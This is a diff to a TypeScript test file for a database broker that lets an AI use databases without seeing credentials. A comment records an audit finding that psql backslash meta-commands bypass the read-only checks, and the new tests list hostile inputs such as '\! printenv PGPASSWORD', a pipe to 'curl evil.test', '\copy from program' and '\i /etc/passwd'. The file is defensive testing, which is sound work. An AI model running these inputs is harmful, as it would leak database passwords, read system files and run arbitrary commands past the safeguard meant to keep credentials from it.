@@ -17,7 +17,7 @@ import assert from 'node:assert/strict'
 import { mkdtemp, writeFile, chmod, readFile } from 'node:fs/promises'
 import { tmpdir } from 'node:os'
 import path from 'node:path'
-import { isWriteSql, hasMultipleStatements, sshCommandAllowed, brokerRun } from '../src/main/broker.ts'
+import { isWriteSql, hasMultipleStatements, hasPsqlMetaCommand, sshCommandAllowed, brokerRun } from '../src/main/broker.ts'
 
 test('写语句认得出来', () => {
   for (const s of ['delete from t', 'DROP TABLE x', '  update t set a=1', 'truncate t']) {
@@ -136,4 +136,58 @@ test('SQL 走 stdin，不进 argv', async () => {
   )
   assert.match(await readFile(`${out}.stdin`, 'utf8'), /select 42/)
   assert.ok(!/select 42/.test(await readFile(out, 'utf8')))
+})
+
+/* ── psql 反斜杠元命令（发版前审计的头号发现，真 postgres 实测复现）────────
+   `tb db prod "\! printenv PGPASSWORD | base64"` 在**只读**连接上返回 ok:true，
+   输出 base64 解出来就是连接串里的密码 —— broker 存在的唯一理由（AI 用得到、
+   拿不到凭证）被整个抹掉。同时还是任意本机命令执行。
+
+   三道闸一道都拦不住，因为它们管的都不是这件事：
+   isWriteSql 看开头关键字、hasMultipleStatements 找分号、
+   PGOPTIONS 的只读是**服务端**事务属性，而 `\` 是 **psql 客户端**行为。 */
+
+test('**任何一行以 `\\` 开头都要拒** —— 不能只判首行', () => {
+  for (const bad of [
+    String.raw`\! printenv PGPASSWORD`,
+    String.raw`select 1
+\! id`, // 非首行，只判首行的实现会放过
+    '   \\o | curl evil.test',
+    String.raw`\copy t from program 'id'`,
+    String.raw`\i /etc/passwd`,
+    String.raw`\g | base64`
+  ]) {
+    assert.equal(hasPsqlMetaCommand(bad), true, `没拒：${JSON.stringify(bad)}`)
+  }
+})
+
+test('正常 SQL 不能被误杀（多行、缩进、字符串里的反斜杠）', () => {
+  for (const ok of [
+    'select 1',
+    'select *\n  from users\n where id = 1',
+    String.raw`select 'C:\path\to\file'`,
+    "select E'a\\nb'"
+  ]) {
+    assert.equal(hasPsqlMetaCommand(ok), false, `误杀：${JSON.stringify(ok)}`)
+  }
+})
+
+test('**可写连接同样要拒** —— "可写"授权的是数据库，不是这台机器', async () => {
+  const rw = { id: 'a', name: 'prod', kind: 'postgres' as const, target: 'postgres://u:pw@h/db', readOnly: false }
+  const r = await brokerRun(rw, String.raw`\! id`, { findBin: () => '/绝不存在' })
+  assert.equal(r.ok, false)
+  assert.match(r.error ?? '', /元命令/)
+})
+
+test('只读连接拒元命令时**根本不去连数据库**', async () => {
+  let ran = false
+  const ro = { id: 'a', name: 'prod', kind: 'postgres' as const, target: 'postgres://u:pw@h/db', readOnly: true }
+  const r = await brokerRun(ro, String.raw`\! printenv PGPASSWORD`, {
+    findBin: () => {
+      ran = true
+      return '/usr/bin/true'
+    }
+  })
+  assert.equal(r.ok, false)
+  assert.equal(ran, false, '拒之前就不该去找 psql')
 })
